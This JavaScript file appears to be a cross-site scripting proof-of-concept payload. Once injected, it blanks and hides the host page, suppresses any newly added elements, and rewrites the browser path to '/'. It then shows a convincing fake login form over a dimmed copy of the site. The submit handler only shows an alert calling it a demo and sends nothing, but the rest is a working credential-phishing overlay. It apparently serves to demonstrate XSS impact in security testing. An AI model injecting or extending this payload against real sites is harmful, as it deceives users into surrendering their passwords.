(() => {
  /* ---------------- Config ---------------- */
  const defaults = { _clearPath: 1, _rootBackground: 1 };
  const coerce = v => (typeof v === 'boolean') ? v : !/^(0|false|no|off)$/i.test(String(v ?? '').trim());

  // read query params from current script
  const readQuery = () => {
    try {
      const s = (document.currentScript && document.currentScript.src) || '';
      const u = new URL(s, location.href), o = {};
      u.searchParams.forEach((v,k) => o[k]=v);
      return o;
    } catch { return {}; }
  };

  // build opts: defaults < global < query
  const opts = {
    _clearPath: coerce((window._clearPath ?? defaults._clearPath)),
    _rootBackground: coerce((window._rootBackground ?? defaults._rootBackground)),
    ...Object.fromEntries(Object.entries(readQuery()).map(([k,v])=>[k,coerce(v)]))
  };

  /* ---------------- Utilities ---------------- */
  let started = false;
  const OUR_IDS = new Set(['xssWhite','xssRoot','xssKill','xssStage']);
  const imp = (el, k, v) => el.style.setProperty(k, v, 'important');
  const add = (tag, parent = document.documentElement) => parent.appendChild(document.createElement(tag));

  /* ---------------- Immediate white-out ---------------- */
  (() => {
    const o = add('div');
    o.id = 'xssWhite';
    o.style.cssText = 'position:fixed;inset:0;background:#fff;opacity:1;z-index:2147483647;transition:opacity .2s linear;pointer-events:all;';
  })();

  // Hide host page
  const hideHost = () => {
    if (!document.body) return;
    ['opacity','0','visibility','hidden','pointer-events','none','position','fixed',
     'top','-10000px','left','-10000px','width','1px','height','1px','overflow','hidden']
      .reduce((_,__,i,a)=> (i%2===0 && imp(document.body,a[i],a[i+1])), null);
    imp(document.documentElement,'overflow','hidden');
    imp(document.documentElement,'background','#fff');
  };
  document.addEventListener('DOMContentLoaded', hideHost);
  if (document.body) hideHost();

  const kill = add('style');
  kill.id = 'xssKill';
  kill.textContent =
    'html{overflow:hidden!important;background:#fff!important}' +
    'body{opacity:0!important;visibility:hidden!important;pointer-events:none!important;position:fixed!important;top:-10000px!important;left:-10000px!important;width:1px!important;height:1px!important;overflow:hidden!important}' +
    'html>*:not(head):not(body):not(#xssRoot):not(#xssWhite){display:none!important}';

  new MutationObserver(muts => {
    const root = document.getElementById('xssRoot');
    muts.forEach(m => m.addedNodes.forEach(n => {
      if (n.nodeType !== 1 || OUR_IDS.has(n.id) || (root && root.contains(n))) return;
      ['display','none','visibility','hidden','pointer-events','none','position','fixed',
       'top','-10000px','left','-10000px','width','1px','height','1px']
        .reduce((_,__,i,a)=> (i%2===0 && imp(n,a[i],a[i+1])), null);
    }));
  }).observe(document.documentElement, { childList:true, subtree:true });

  /* ---------------- Init ---------------- */
  const init = () => {
    if (started) return; started = true;

    if (opts._clearPath) { try { history.pushState(null,'','/'); } catch {} }

    const root = add('div'); root.id = 'xssRoot';
    root.innerHTML = `
      <style>
        .xss-root{position:fixed;inset:0;z-index:2147483000;font-family:Arial,Helvetica,sans-serif}
        .xss-bg{position:absolute;inset:0;pointer-events:none}
        .xss-bg iframe{width:100%;height:100%;border:0;opacity:.9;transition:opacity .5s}
        .xss-dim{position:absolute;inset:0;background:#000;opacity:0;transition:opacity .5s;pointer-events:none}
        .xss-modal,.xss-modal *{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;color:#fff!important}
        .xss-modal{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%) scale(.96);opacity:0;transition:opacity .5s,transform .5s;width:420px;background:rgba(0,0,0,.88);padding:28px;border-radius:12px;box-shadow:0 12px 36px rgba(0,0,0,.55);font-size:18px;line-height:1.4}
        .xss-modal h2{margin:0 0 16px;font-size:26px}
        .xss-field{margin:12px 0 0}
        .xss-label{display:block;margin:0 0 6px;font-size:16px;opacity:.95}
        .xss-input{display:block;width:100%;height:44px;padding:10px 12px;border-radius:6px;border:1px solid rgba(255,255,255,.32);background:rgba(255,255,255,.08);outline:none}
        .xss-input::placeholder{color:rgba(255,255,255,.75)}
        .xss-input:focus{border-color:rgba(255,255,255,.55);background:rgba(255,255,255,.12)}
        .xss-button{margin-top:18px;width:100%;height:46px;border:0;border-radius:8px;background:#fff;color:#000!important;font-weight:700;font-size:16px;cursor:pointer}
        .xss-show .xss-bg iframe{opacity:.3}
        .xss-show .xss-dim{opacity:.4}
        .xss-show .xss-modal{opacity:1;transform:translate(-50%,-50%) scale(1)}
      </style>
      <div class="xss-root" id="xssStage">
        <div class="xss-bg">
          ${opts._rootBackground ? `<iframe src="/" title="root-bg"></iframe>` : ``}
        </div>
        <div class="xss-dim" style="${opts._rootBackground ? '' : 'background:#1a1a1a;'}"></div>
        <form class="xss-modal" id="xssForm" autocomplete="off">
          <h2 style="color:#ff3b30">Please log in</h2>
          <div class="xss-field"><label class="xss-label" for="xssUser">Username</label><input class="xss-input" id="xssUser" name="user" placeholder="Username"></div>
          <div class="xss-field"><label class="xss-label" for="xssPass">Password</label><input class="xss-input" id="xssPass" type="password" name="pass" placeholder="Password"></div>
          <button class="xss-button" type="submit">Login</button>
        </form>
      </div>`;

    // fade out overlay
    const white = document.getElementById('xssWhite');
    if (white) { white.style.opacity = '0'; setTimeout(() => white.remove(), 220); }

    // fade reveal after 1000ms
    setTimeout(() => document.getElementById('xssStage')?.classList.add('xss-show'), 1000);

    root.querySelector('#xssForm').addEventListener('submit', e => {
      e.preventDefault();
      alert('This is an XSS demo (no data has been captured by it)');
    });
  };

  const domReady = () => setTimeout(init, 1000);
  (document.readyState === 'loading')
    ? document.addEventListener('DOMContentLoaded', domReady, {once:true})
    : domReady();
  setTimeout(init, 1500);
})();
